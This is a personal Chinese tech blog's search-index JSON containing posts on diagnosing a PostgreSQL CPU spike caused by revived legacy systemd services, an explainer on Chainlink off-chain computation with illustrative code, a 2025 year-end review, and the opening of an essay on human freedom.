{"meta":{"title":"thisHu's log","subtitle":"暴躁的程序员","description":"使卵石臻与完美的，非锤的打击，而是水的且歌且舞","author":{"name":"ivhu","email":"ivhu@foxmail.com"},"url":"https://bighu630.github.io","root":"/"},"pages":[{"title":"404 Page Not Found","date":"2024-08-30T15:36:59.000Z","updated":"2026-02-27T03:14:28.898Z","comments":true,"path":"404.html","permalink":"https://bighu630.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2024-08-29T16:50:51.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"about/index.html","permalink":"https://bighu630.github.io/about/index.html","excerpt":"","text":""},{"title":"","date":"2026-02-27T11:47:02.394Z","updated":"2026-02-27T11:47:02.394Z","comments":true,"path":"css/custom-fix.css","permalink":"https://bighu630.github.io/css/custom-fix.css","excerpt":"","text":"#u-search .modal .modal-header { background: var(--color-card) !important; } .l_header.nav-sub .wrapper { background: var(--color-card) !important; } #u-search .modal .modal-header { background: rgba(255,255,255,0.95) !important; } .l_header.nav-sub .wrapper { background: rgba(255,255,255,0.95) !important; } [data-theme=\"dark\"] #u-search .modal .modal-header { background: rgba(68,68,68,0.95) !important; } [data-theme=\"dark\"] .l_header.nav-sub .wrapper { background: rgba(68,68,68,0.95) !important; }"},{"title":"所有分类","date":"2024-09-02T02:02:11.000Z","updated":"2026-02-27T03:14:28.902Z","comments":true,"path":"categories/index.html","permalink":"https://bighu630.github.io/categories/index.html","excerpt":"","text":""},{"title":"我们的朋友","date":"2026-02-27T03:14:28.902Z","updated":"2026-02-27T03:14:28.902Z","comments":true,"path":"friends/index.html","permalink":"https://bighu630.github.io/friends/index.html","excerpt":"","text":""},{"title":"关于","date":"2024-08-29T16:50:51.000Z","updated":"2026-02-27T03:14:28.903Z","comments":true,"path":"search/index.html","permalink":"https://bighu630.github.io/search/index.html","excerpt":"","text":""},{"title":"Tags","date":"2024-08-30T08:03:26.000Z","updated":"2026-02-27T03:14:28.903Z","comments":true,"path":"tags/index.html","permalink":"https://bighu630.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"PostgreSQL慢查询故障排查实战：从监控告警到根因定位","slug":"PostgreSQL慢查询故障排查实战","date":"2026-02-27T09:51:51.000Z","updated":"2026-02-27T11:40:04.392Z","comments":true,"path":"2026/02/27/PostgreSQL慢查询故障排查实战/","permalink":"https://bighu630.github.io/2026/02/27/PostgreSQL%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5%E5%AE%9E%E6%88%98/","excerpt":"","text":"故障背景某周五下午，监控系统突然告警： 页面加载缓慢：用户反馈部分数据加载异常缓慢 Kafka堆积：消息队列出现明显堆积，处理延迟增加 数据库异常：监控显示PostgreSQL写入时间显著增长 作为值班工程师，我立即投入故障排查。这是一次典型的数据库性能问题，但根因却出人意料。 第一阶段：问题确认1.1 监控指标分析首先查看监控面板，发现以下异常： 数据库CPU使用率：持续100%，已完全饱和 磁盘IO：读写延迟增加，但未达到瓶颈 连接数：正常范围内，无连接池耗尽 内存使用：Buffer命中率下降 1.2 初步判断基于监控数据，初步判断： 不是硬件资源不足（内存、磁盘正常） 不是连接数问题 核心问题：CPU被某些查询完全占用 第二阶段：问题排查2.1 查找慢查询使用PostgreSQL内置视图查找当前活跃的慢查询： -- 查找当前正在执行的慢查询 SELECT pid, now() - query_start AS duration, query, wait_event FROM pg_stat_activity WHERE state = &#39;active&#39; ORDER BY duration DESC LIMIT 10; 执行结果： pid | duration | query | wait_event ------+--------------+----------------------------------------------------------+------------ 1942 | 00:45:23.15 | SELECT * FROM user_behavior WHERE created_at &gt; now() - interval &#39;30 days&#39; | 1943 | 00:32:11.42 | UPDATE order_stats SET count = count + 1 WHERE date = &#39;2026-02-27&#39; | 1945 | 00:28:54.67 | SELECT ... (复杂JOIN查询) | 发现了几个执行时间超过30分钟的查询。 2.2 “摇人”认领SQL在团队群中发布这些SQL，让相关业务负责人认领： 查询1：用户行为分析报表 → 数据分析团队 查询2：订单统计更新 → 订单服务团队 查询3：复杂JOIN查询 → 未知来源 2.3 第一阶段处理数据分析团队和订单服务团队确认后，进行了以下处理： 用户行为查询优化：添加索引 CREATE INDEX idx_user_behavior_created_at ON user_behavior(created_at) 订单统计优化：改为批量更新，避免单行频繁更新 预期效果：CPU使用率应该下降。 实际结果：无事发生，CPU依然100% 第三阶段：深入排查3.1 分析历史查询统计既然当前活跃查询不是全部问题，查看历史查询统计： -- 查看累计消耗CPU最多的查询 SELECT query, calls, -- 执行次数 round(total_exec_time::numeric, 2) as total_time, -- 总执行耗时(ms) round(mean_exec_time::numeric, 2) as avg_time, -- 平均单次耗时(ms) round((100 * total_exec_time / sum(total_exec_time) OVER ())::numeric, 2) AS percentage_cpu, -- 耗时占比 rows, -- 总影响行数 shared_blks_hit, -- 内存命中次数 shared_blks_read -- 物理磁盘读取次数 FROM pg_stat_statements ORDER BY total_exec_time DESC LIMIT 5; 关键发现： query | calls | total_time | avg_time | percentage_cpu | rows | shared_blks_hit | shared_blks_read -------------------------------------------+-------+------------+----------+----------------+---------+-----------------+------------------ SELECT * FROM legacy_data WHERE status = 0 | 48215 | 1845234.67 | 38.27 | 42.35% | 4821500 | 15234 | 48215000 UPDATE legacy_table SET flag = 1 WHERE ... | 24108 | 923456.12 | 38.31 | 21.18% | 241080 | 8123 | 24108000 惊人发现： 两个查询消耗了**63.53%**的CPU时间 这些查询来自很老的代码，业务团队已无人认领 物理磁盘读取次数极高，说明索引缺失或失效 3.2 定位执行源既然无人认领，需要找到是哪些服务器在执行这些查询： -- 查找执行慢查询的客户端信息 SELECT pid, -- 后端进程ID usename, -- 执行查询的用户名 client_addr, -- 客户端的IP地址 client_port, -- 客户端使用的端口号 datname, -- 连接的数据库名 application_name, -- 客户端的应用名称 now() - query_start AS duration, -- 查询已经执行的时间 state, -- 当前的查询状态 query -- 正在执行的慢查询语句 FROM pg_stat_activity WHERE state = &#39;active&#39; -- 只查看活跃的连接 AND now() - query_start &gt; interval &#39;30 seconds&#39; -- 设定慢查询阈值 AND query !~ &#39;^[[:space:]]*$&#39; -- 排除空查询 AND query !~ &#39;^[[:space:]]*pg_stat_activity&#39; -- 排除对本视图的查询 ORDER BY duration DESC; 执行结果： pid | usename | client_addr | client_port | datname | application_name | duration | state | query ------+---------+--------------+-------------+---------+------------------+--------------+--------+---------------------------------------------------------- 1950 | appuser | 10.0.12.45 | 54322 | appdb | legacy-service-1 | 00:12:34.56 | active | SELECT * FROM legacy_data WHERE status = 0 1951 | appuser | 10.0.12.46 | 54323 | appdb | legacy-service-2 | 00:11:22.33 | active | UPDATE legacy_table SET flag = 1 WHERE ... 1952 | appuser | 10.0.12.47 | 54324 | appdb | legacy-service-3 | 00:10:15.78 | active | SELECT * FROM legacy_data WHERE status = 0 关键信息： 客户端IP：10.0.12.45、10.0.12.46、10.0.12.47 应用名称：legacy-service-* 这些是老旧的遗留服务 第四阶段：根因定位与解决4.1 服务器排查登录到这些服务器进行检查： # 检查服务器上的服务 ssh 10.0.12.45 systemctl list-units --type=service | grep legacy # 发现服务状态 legacy-service-1.service loaded active running Legacy Data Processor legacy-service-2.service loaded active running Legacy Data Updater legacy-service-3.service loaded active running Legacy Data Sync 4.2 问题根因经过调查发现： 根本原因： 这些是三年前的遗留服务，早已下线 上周进行了服务器重启维护 systemd服务配置未被清理，重启后自动拉起 服务启动后，开始执行遗留的业务逻辑 遗留代码中的SQL没有优化，导致数据库CPU打满 4.3 解决方案立即执行以下操作： # 停止遗留服务 ssh 10.0.12.45 &quot;sudo systemctl stop legacy-service-1&quot; ssh 10.0.12.46 &quot;sudo systemctl stop legacy-service-2&quot; ssh 10.0.12.47 &quot;sudo systemctl stop legacy-service-3&quot; # 禁用服务，防止重启后再次拉起 ssh 10.0.12.45 &quot;sudo systemctl disable legacy-service-1&quot; ssh 10.0.12.46 &quot;sudo systemctl disable legacy-service-2&quot; ssh 10.0.12.47 &quot;sudo systemctl disable legacy-service-3&quot; # 清理服务配置文件 ssh 10.0.12.45 &quot;sudo rm -f /etc/systemd/system/legacy-service-*.service&quot; ssh 10.0.12.46 &quot;sudo rm -f /etc/systemd/system/legacy-service-*.service&quot; ssh 10.0.12.47 &quot;sudo rm -f /etc/systemd/system/legacy-service-*.service&quot; # 重新加载systemd配置 ssh 10.0.12.45 &quot;sudo systemctl daemon-reload&quot; ssh 10.0.12.46 &quot;sudo systemctl daemon-reload&quot; ssh 10.0.12.47 &quot;sudo systemctl daemon-reload&quot; 4.4 效果验证停止服务后，立即观察监控： CPU使用率：从100%降至25% 页面加载：恢复正常速度 Kafka堆积：逐渐消费完毕 数据库写入时间：恢复正常水平 第五阶段：故障复盘与预防5.1 故障时间线timeline title PostgreSQL慢查询故障时间线 section 故障发生 17:00 : 监控告警&lt;br&gt;页面加载缓慢 17:05 : Kafka出现堆积&lt;br&gt;数据库写入延迟增加 17:10 : 数据库CPU达到100% section 排查过程 17:15 : 查找当前慢查询&lt;br&gt;&quot;摇人&quot;认领SQL 17:30 : 优化已知SQL&lt;br&gt;但CPU未下降 17:45 : 分析历史查询统计&lt;br&gt;发现遗留SQL 18:00 : 定位执行源&lt;br&gt;找到遗留服务 section 解决恢复 18:15 : 停止遗留服务&lt;br&gt;CPU开始下降 18:30 : 清理服务配置&lt;br&gt;防止再次拉起 18:45 : 所有指标恢复正常 5.2 根本原因分析 层面 问题 改进措施 代码层面 遗留代码未清理 建立代码下线流程 部署层面 systemd配置未清理 服务下线时清理配置 监控层面 未监控”僵尸服务” 增加服务健康检查 流程层面 服务器重启无检查清单 制定重启检查清单 5.3 预防措施5.3.1 技术措施 数据库层面： -- 定期清理pg_stat_statements SELECT pg_stat_statements_reset(); -- 设置查询超时 ALTER DATABASE appdb SET statement_timeout = &#39;30s&#39;; -- 监控异常查询 CREATE EXTENSION pg_stat_statements; 系统层面： # 定期检查&quot;僵尸服务&quot; #!/bin/bash # find-zombie-services.sh for server in ${SERVERS[@]}; do echo &quot;Checking $server...&quot; ssh $server &quot;systemctl list-units --type=service --state=running | grep -E &#39;(legacy|old|deprecated)&#39;&quot; done 监控告警： 监控pg_stat_statements中的异常查询模式 设置CPU使用率梯度告警（80%、90%、95%） 监控未知客户端的数据库连接 5.3.2 流程措施 服务下线流程： 1. 代码仓库标记为deprecated 2. 停止生产环境服务 3. 清理部署配置（systemd、k8s、docker） 4. 清理数据库用户和权限 5. 更新运维文档 6. 三个月后删除代码 服务器重启检查清单： [ ] 检查所有自启动服务 [ ] 验证服务健康状态 [ ] 检查数据库连接 [ ] 验证监控告警 [ ] 业务功能测试 5.4 技术总结5.4.1 PostgreSQL排查命令总结-- 1. 当前活跃查询 SELECT * FROM pg_stat_activity WHERE state = &#39;active&#39;; -- 2. 锁等待情况 SELECT * FROM pg_locks WHERE granted = false; -- 3. 表大小和膨胀 SELECT schemaname, tablename, pg_size_pretty(pg_total_relation_size(schemaname||&#39;.&#39;||tablename)) FROM pg_tables WHERE schemaname NOT IN (&#39;pg_catalog&#39;, &#39;information_schema&#39;) ORDER BY pg_total_relation_size(schemaname||&#39;.&#39;||tablename) DESC; -- 4. 索引使用情况 SELECT schemaname, tablename, indexname, idx_scan, idx_tup_read, idx_tup_fetch FROM pg_stat_user_indexes ORDER BY idx_scan DESC; -- 5. 慢查询统计（需要pg_stat_statements扩展） SELECT query, calls, total_time, mean_time, rows FROM pg_stat_statements ORDER BY total_time DESC LIMIT 10; 5.4.2 性能优化建议 查询优化： 避免SELECT *，只选择需要的列 添加合适的索引 使用EXPLAIN ANALYZE分析查询计划 连接管理： 使用连接池（如PgBouncer） 设置合理的连接超时 监控连接数和使用模式 监控告警： 监控慢查询数量 监控锁等待时间 监控WAL增长速率 经验教训6.1 技术层面 监控不能只看表面：CPU 100%只是表象，需要深入分析 历史数据很重要：pg_stat_statements是排查利器 客户端信息是关键：pg_stat_activity中的客户端信息帮助定位问题源 6.2 运维层面 服务生命周期管理：服务下线要有完整流程 配置即代码：systemd配置应该纳入版本管理 重启风险控制：服务器重启前要有检查清单 6.3 团队协作 “摇人”机制有效：快速定位问题责任人 知识共享重要：老代码无人认领是隐患 文档必须更新：服务状态变更要及时记录 结语这次故障排查经历了从表面现象到根因定位的全过程。最初以为是简单的慢查询问题，经过层层排查，最终发现是服务器重启导致遗留服务被拉起这一根本原因。 关键启示： 数据库性能问题往往不是数据库本身的问题 系统性的运维问题需要系统性的解决方案 预防优于治疗，完善的服务管理流程至关重要 通过这次故障，我们不仅解决了眼前的问题，更重要的是建立了完整的预防机制，确保类似问题不再发生。这正是运维工作的价值所在——让故障成为改进的机会。 故障信息： 发生时间：2026年2月27日 17:00-18:45 影响范围：部分页面加载、消息队列处理 解决时间：1小时45分钟 根本原因：服务器重启导致遗留服务自动拉起 改进措施：完善服务下线流程、增加监控项、制定重启检查清单 技术栈：PostgreSQL 15、systemd、监控告警系统、Kafka 本文基于真实故障案例整理，部分细节已脱敏处理。","categories":[{"name":"技术实战","slug":"技术实战","permalink":"https://bighu630.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/"},{"name":"数据库","slug":"技术实战/数据库","permalink":"https://bighu630.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"PostgreSQL","slug":"PostgreSQL","permalink":"https://bighu630.github.io/tags/PostgreSQL/"},{"name":"故障排查","slug":"故障排查","permalink":"https://bighu630.github.io/tags/%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/"},{"name":"数据库优化","slug":"数据库优化","permalink":"https://bighu630.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BC%98%E5%8C%96/"},{"name":"监控告警","slug":"监控告警","permalink":"https://bighu630.github.io/tags/%E7%9B%91%E6%8E%A7%E5%91%8A%E8%AD%A6/"},{"name":"系统运维","slug":"系统运维","permalink":"https://bighu630.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"}]},{"title":"Chainlink链下计算机制深入解析","slug":"Chainlink-链下计算机制深入解析","date":"2026-02-27T03:30:00.000Z","updated":"2026-02-27T03:25:45.712Z","comments":true,"path":"2026/02/27/Chainlink-链下计算机制深入解析/","permalink":"https://bighu630.github.io/2026/02/27/Chainlink-%E9%93%BE%E4%B8%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%88%B6%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90/","excerpt":"","text":"Chainlink作为区块链世界与现实世界的桥梁，其链下计算机制是智能合约能够安全可靠地访问外部数据和执行复杂计算的关键。本文将从技术实现的角度，深入剖析Chainlink如何解决区块链的”数据孤岛”问题。 什么是链下计算？ 在讨论Chainlink之前，我们需要先理解什么是链下计算，以及为什么区块链需要它。 区块链的核心特性是确定性执行——每个节点必须能够独立验证交易并达成相同的结果。这种设计带来了安全性和一致性，但也带来了严重的限制： 数据隔离：智能合约无法直接访问链外数据 计算限制：复杂的计算在链上执行成本高昂 实时性差：区块链的确认时间限制了实时交互 链下计算（Off-chain Computation）就是为了解决这些问题而提出的方案。它的核心思想是：将不适合在链上执行的计算和数据获取移到链外处理，然后将结果以可验证的方式提交到链上。 Chainlink的链下计算不是简单的”外包计算”，而是一个完整的去中心化计算框架。 Chainlink架构解析整体架构让我们先看一下Chainlink的基本架构： ┌─────────────────────────────────────────────┐ │ 区块链（链上） │ │ ┌─────────────────────────────────────┐ │ │ │ Chainlink合约 │ │ │ │ • Oracle合约 │ │ │ │ • 服务协议合约 │ │ │ │ • 聚合合约 │ │ │ └─────────────────────────────────────┘ │ └───────────────────┬─────────────────────────┘ │ 请求/响应 ▼ ┌─────────────────────────────────────────────┐ │ Chainlink网络（链下） │ │ ┌─────────┐ ┌─────────┐ ┌─────────┐ │ │ │ 节点1 │ │ 节点2 │ │ 节点3 │ │ │ │ • 数据 │ │ • 数据 │ │ • 数据 │ │ │ │ • 计算 │ │ • 计算 │ │ • 计算 │ │ │ └─────────┘ └─────────┘ └─────────┘ │ │ │ │ │ │ │ └───────────┼───────────┘ │ │ ▼ │ │ ┌─────────────────┐ │ │ │ 外部API/数据源 │ │ │ └─────────────────┘ │ └─────────────────────────────────────────────┘ 核心组件1. Chainlink节点（Chainlink Node）这是Chainlink网络的执行单元。每个节点包含： // 简化的节点结构 type ChainlinkNode struct { // 身份和配置 address common.Address privateKey *ecdsa.PrivateKey config NodeConfig // 任务执行引擎 jobRunner *JobRunner adapterMgr *AdapterManager // 通信层 ethClient *ethclient.Client txManager *TransactionManager // 数据源连接 adapters map[string]Adapter } 节点通过适配器（Adapter） 与外部数据源交互，每个适配器负责特定的数据获取或计算任务。 2. 任务（Job）任务是Chainlink执行的基本单位，定义了完整的工作流程： { &quot;name&quot;: &quot;ETH-USD价格聚合&quot;, &quot;initiators&quot;: [ { &quot;type&quot;: &quot;runlog&quot;, &quot;params&quot;: { &quot;address&quot;: &quot;0x123...abc&quot; } } ], &quot;tasks&quot;: [ { &quot;type&quot;: &quot;httpget&quot;, &quot;params&quot;: { &quot;get&quot;: &quot;https://api.coingecko.com/api/v3/simple/price?ids=ethereum&amp;vs_currencies=usd&quot; } }, { &quot;type&quot;: &quot;jsonparse&quot;, &quot;params&quot;: { &quot;path&quot;: [&quot;ethereum&quot;, &quot;usd&quot;] } }, { &quot;type&quot;: &quot;multiply&quot;, &quot;params&quot;: { &quot;times&quot;: 100000000 } }, { &quot;type&quot;: &quot;ethuint256&quot; }, { &quot;type&quot;: &quot;ethtx&quot;, &quot;params&quot;: { &quot;address&quot;: &quot;0x456...def&quot; } } ] } 3. 外部适配器（External Adapter）对于复杂的计算或专有数据源，Chainlink支持外部适配器： // 一个简单的外部适配器示例 const express = require(&#39;express&#39;); const app = express(); app.use(express.json()); app.post(&#39;/&#39;, async (req, res) =&gt; { try { const { data } = req.body; // 执行复杂的链下计算 const result = await performComplexCalculation(data); // 返回标准化格式 res.json({ jobRunID: req.body.id, data: { result }, statusCode: 200 }); } catch (error) { res.status(500).json({ jobRunID: req.body.id, status: &quot;errored&quot;, error: error.message }); } }); async function performComplexCalculation(input) { // 这里可以是机器学习推理、大数据分析等复杂计算 // 这些计算在链上执行成本过高 return { prediction: 0.85, confidence: 0.92, metadata: { model: &quot;v1.2.0&quot;, inferenceTime: &quot;125ms&quot; } }; } 链下计算的工作流程1. 请求阶段智能合约发出数据请求： // 智能合约中的请求示例 pragma solidity ^0.8.0; import &quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&quot;; contract PriceConsumer { AggregatorV3Interface internal priceFeed; constructor(address _priceFeed) { priceFeed = AggregatorV3Interface(_priceFeed); } function getLatestPrice() public view returns (int) { ( uint80 roundId, int price, uint startedAt, uint updatedAt, uint80 answeredInRound ) = priceFeed.latestRoundData(); return price; } } 2. 事件监听Chainlink节点监听区块链事件： // 节点监听事件 func (n *ChainlinkNode) listenForEvents() { query := ethereum.FilterQuery{ Addresses: []common.Address{n.oracleContract}, } logs := make(chan types.Log) sub, err := n.ethClient.SubscribeFilterLogs(context.Background(), query, logs) if err != nil { log.Fatal(err) } for { select { case err := &lt;-sub.Err(): log.Fatal(err) case vLog := &lt;-logs: // 解析事件并创建任务 event, err := n.parseOracleRequest(vLog) if err != nil { continue } n.jobQueue &lt;- event } } } 3. 任务执行节点执行定义的任务流水线： // 任务执行引擎 func (r *JobRunner) runJob(job JobSpec, input interface{}) (interface{}, error) { var result interface{} = input for _, task := range job.Tasks { adapter, exists := r.adapters[task.Type] if !exists { return nil, fmt.Errorf(&quot;adapter not found: %s&quot;, task.Type) } output, err := adapter.Execute(result, task.Params) if err != nil { return nil, fmt.Errorf(&quot;task %s failed: %v&quot;, task.Type, err) } result = output } return result, nil } 4. 结果聚合与提交多个节点的结果通过聚合合约处理： // 简化的聚合合约 contract Aggregator { struct Submission { int256 answer; uint256 timestamp; address node; } Submission[] public submissions; uint256 public submissionCount; function submit(int256 _answer) external { require(isValidNode(msg.sender), &quot;Invalid node&quot;); submissions.push(Submission({ answer: _answer, timestamp: block.timestamp, node: msg.sender })); submissionCount++; if (submissionCount &gt;= requiredSubmissions) { int256 aggregatedAnswer = calculateAggregate(); emit AnswerUpdated(aggregatedAnswer, block.timestamp); submissionCount = 0; delete submissions; } } function calculateAggregate() internal view returns (int256) { // 多种聚合策略：中位数、平均值、加权平均等 if (aggregationStrategy == AggregationStrategy.Median) { return calculateMedian(); } else if (aggregationStrategy == AggregationStrategy.Mean) { return calculateMean(); } revert(&quot;Invalid aggregation strategy&quot;); } } 安全机制1. 去中心化与冗余Chainlink通过多个独立节点提供相同服务来实现安全： // 节点选择算法 func selectNodes(request Request, availableNodes []Node) []Node { // 基于声誉评分选择 sortedNodes := sortByReputation(availableNodes) // 考虑节点多样性（地理位置、客户端版本等） diverseNodes := ensureDiversity(sortedNodes) // 返回所需数量的节点 return diverseNodes[:request.RequiredNodes] } 2. 数据验证// 数据验证流程 func validateResponses(responses []Response) (bool, error) { // 1. 格式验证 for _, resp := range responses { if !isValidFormat(resp) { return false, fmt.Errorf(&quot;invalid format from %s&quot;, resp.Node) } } // 2. 一致性检查 if !areConsistent(responses) { // 触发争议机制 triggerDispute(responses) return false, errors.New(&quot;responses inconsistent&quot;) } // 3. 异常值检测 cleanedResponses := removeOutliers(responses) return true, nil } 3. 声誉系统每个节点都有声誉评分： struct NodeReputation { uint256 totalRequests; uint256 successfulResponses; uint256 failedResponses; uint256 averageResponseTime; uint256 lastActive; uint256 stakeAmount; } 实际应用场景1. 复杂计算卸载场景：机器学习模型推理 # 链下机器学习推理适配器 def ml_inference_adapter(input_data): # 加载预训练模型（链下） model = load_model(&#39;price_prediction_v2.h5&#39;) # 数据预处理 processed_data = preprocess(input_data) # 执行推理（计算密集型） prediction = model.predict(processed_data) # 生成可验证证明（可选） proof = generate_zk_proof(processed_data, prediction) return { &#39;prediction&#39;: float(prediction[0]), &#39;confidence&#39;: float(prediction[1]), &#39;proof&#39;: proof # 用于链上验证 } 2. 大数据聚合场景：多数据源价格聚合 func aggregatePriceData(sources []PriceSource) (float64, error) { var prices []float64 var weights []float64 for _, source := range sources { price, err := fetchPrice(source) if err != nil { continue // 容错处理 } prices = append(prices, price) weights = append(weights, source.Weight) } if len(prices) &lt; minimumSources { return 0, errors.New(&quot;insufficient data sources&quot;) } // 加权中位数计算 weightedMedian := calculateWeightedMedian(prices, weights) return weightedMedian, nil } 3. 隐私保护计算场景：隐私数据验证 // 使用TEE（可信执行环境）的隐私计算 async function privacyPreservingVerification(userData) { // 1. 在TEE中解密数据 const decryptedData = await teeDecrypt(userData.encryptedData); // 2. 执行验证逻辑（永远不出TEE） const isValid = verifyBusinessLogic(decryptedData); // 3. 只输出验证结果，不泄露原始数据 const attestation = generateTEEAttestation(isValid); return { verified: isValid, attestation: attestation, timestamp: Date.now() }; } 技术挑战与解决方案挑战1：数据源可靠性问题：单个数据源可能失效或被篡改 解决方案： 多数据源冗余 数据源声誉系统 异常检测算法 挑战2：计算可验证性问题：如何证明链下计算正确执行 解决方案： 零知识证明（zk-SNARKs&#x2F;zk-STARKs） TEE（可信执行环境）证明 多节点重复计算验证 挑战3：延迟与成本平衡问题：链下计算需要时间，但区块链需要及时响应 解决方案： type ComputationStrategy struct { // 计算模式选择 Mode string // &quot;realtime&quot;, &quot;batch&quot;, &quot;optimistic&quot; // 超时处理 Timeout time.Duration FallbackData interface{} // 成本优化 MaxCost *big.Int GasPriceCap *big.Int } 与同类方案的对比 特性 Chainlink API3 Band Protocol Pyth Network 计算模型 链下执行+链上聚合 第一方预言机 跨链数据 拉取式预言机 节点类型 去中心化节点网络 API提供方直接运行 验证者节点 数据发布者 数据验证 多节点共识 数据源签名 代币质押 Pythnet共识 计算能力 支持复杂计算 主要数据获取 简单计算 金融数据 适用场景 通用计算+数据 Web2 API集成 跨链数据 高频金融数据 未来发展方向1. CCIP（跨链互操作协议）Chainlink正在扩展其能力到跨链通信领域： // CCIP简化示例 interface ICCIP { function sendMessage( uint64 destinationChainSelector, address receiver, bytes calldata data ) external returns (bytes32 messageId); function receiveMessage( uint64 sourceChainSelector, address sender, bytes calldata data ) external; } 2. FSS（公平排序服务）解决MEV（矿工可提取价值）问题： // FSS合约接口 interface IFairSequencer { function submitTransaction( bytes calldata txData, uint256 bid ) external returns (uint256 position); function getTransactionOrder() external view returns (bytes32[] memory orderedTxs); } 3. 链下计算标准化推动行业标准： # 链下计算任务描述标准（提案） version: &quot;1.0&quot; task: type: &quot;computation&quot; inputs: - name: &quot;input_data&quot; type: &quot;bytes&quot; outputs: - name: &quot;result&quot; type: &quot;uint256&quot; computation: engine: &quot;docker&quot; image: &quot;chainlink/computation:v1.2&quot; resources: cpu: &quot;2&quot; memory: &quot;4Gi&quot; timeout: &quot;30s&quot; verification: method: &quot;multi_node&quot; required_nodes:","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"预言机","slug":"区块链/预言机","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%A2%84%E8%A8%80%E6%9C%BA/"}],"tags":[{"name":"Chainlink","slug":"Chainlink","permalink":"https://bighu630.github.io/tags/Chainlink/"},{"name":"链下计算","slug":"链下计算","permalink":"https://bighu630.github.io/tags/%E9%93%BE%E4%B8%8B%E8%AE%A1%E7%AE%97/"},{"name":"预言机","slug":"预言机","permalink":"https://bighu630.github.io/tags/%E9%A2%84%E8%A8%80%E6%9C%BA/"},{"name":"智能合约","slug":"智能合约","permalink":"https://bighu630.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"去中心化","slug":"去中心化","permalink":"https://bighu630.github.io/tags/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96/"}],"author":"ivhu"},{"title":"2025年度总结","slug":"2025年度总结","date":"2026-01-28T12:43:17.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2026/01/28/2025年度总结/","permalink":"https://bighu630.github.io/2026/01/28/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","excerpt":"","text":"2026已经一个月了，才来写年度总结😅 不过一月一号也不是什么大的分割点，更像是一个普普通通的时间分割，所以按阴历年算，还不算晚 总结而言 2025是 变化很大，收获很小。 先说变化最大的变化是工作环境的变化，从坐班到居家办公，从城市回老家。 还有就是工作的变化，现在看来我第一份工作确实有点稀里糊涂，或者说第一份工作给我更多的是理论上的知识。我说他稀里糊涂也是指在效益上，并没有很实际的经济效益，更多的是理论深究。 当然这也是相对于我后后面两份工作而言（变化之大另一方面是我一年换了两份工作，内容差不多，也都是居家） 关于工作：最大的变化是从理论研究到真正的写业务代码。 然后就是在老家生活带来的变化，虽然合肥本来是就是一个节奏比较慢的城市，但老家节奏更慢，甚至大部分时候都意识不到节奏。还有就是各种鸡毛蒜皮的小事多了很多，整个人确实不忙，但是似乎也没闲着。 在加上居家办公基本上是一点一线😁，我可能是不大喜欢这样 收获说实话，这一年最大的收获或许是在写代码上，会写很多业务代码了，但是也没那么会写，写业务不是简简单单能用就行，更重要的是怎么方便以后拓展，怎么与已经有的东西结合，怎么判断需要多少资源，以及监控各种资源。 可能理论上能跑的代码，因为并发量上来，数据库坚持不住，又或者受各种缓存影响，导致各种数据缺失。 总之这一年写了不少业务代码，也算是对业务代码有一点点入门级的了解。 除了写代码方面，这一年基本没什么大的收获，没怎么看书，博客也只写了7篇（一整年只有7篇，除了一篇胎死腹中的），也没有研究什么有意思的技术，甚至是博客都没怎么看，有问题都是问ai, 其他时间都是在吃电子大麻 当然还有一点收获是 工资涨了不少😁 产出 这一段就是想到什么写什么了 用我的老电脑做的homelab，在家里用steam link+平板打游戏是真的爽 clientPool 库：用go做的一个业务监控+负载均衡库 linux 状态栏歌词，用ai写着玩的 换到niri, 也算是找到一个稳定可用的平铺窗口管理了 其他基本上都是工作和鸡毛蒜皮的事情了，没想到我这一年基本啥产出都没有😢 2026还有2-3个星期就要过年了，这两周也不会有什么大的变化 稍稍写点2026的预期 去一个同学比较多的城市 多看点书，不要越来越短视 少吸点电子大麻 ai 需要用想象力 利用起来 许愿池 赐予我一个女朋友 虚拟货币大跌","categories":[{"name":"总结","slug":"总结","permalink":"https://bighu630.github.io/categories/%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"2025","slug":"2025","permalink":"https://bighu630.github.io/tags/2025/"}],"author":"ivhu"},{"title":"人及其自由","slug":"人及其自由","date":"2025-11-15T00:53:15.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2025/11/15/人及其自由/","permalink":"https://bighu630.github.io/2025/11/15/%E4%BA%BA%E5%8F%8A%E5%85%B6%E8%87%AA%E7%94%B1/","excerpt":"","text":"关于人，我这里不想讲人与其他动物的区别，作为有自由意志的东西，区别于其他动物难道是一个很难的问题？ 当然我也不想过于细致，导致凭空多出几十亿个物种。我想如果我表述的清楚，并且你恰好能理解我所说的，那么关于你是不是人这个问题应该并不重要，反而关于“我是谁”的这个问题可能思路会更加明了。 关于人是什么，我想大体有两个点： 选择性无视 选择性遗忘 我并不想通过人的机能来确定某个东西是人，也许有下人生来就缺失那些机能，但他还是人。依我理解人之为人，并不是因为他可以做什么，或者不能做什么，而是因为他无可避免的选择性无视与选择性遗忘 关于人的选择性无语与选择性遗忘，这并不是人自由意识的选择（关于自由意识后面在讲），需要明确是这两个选择才定义的人，不要本末倒置。 选择性无视 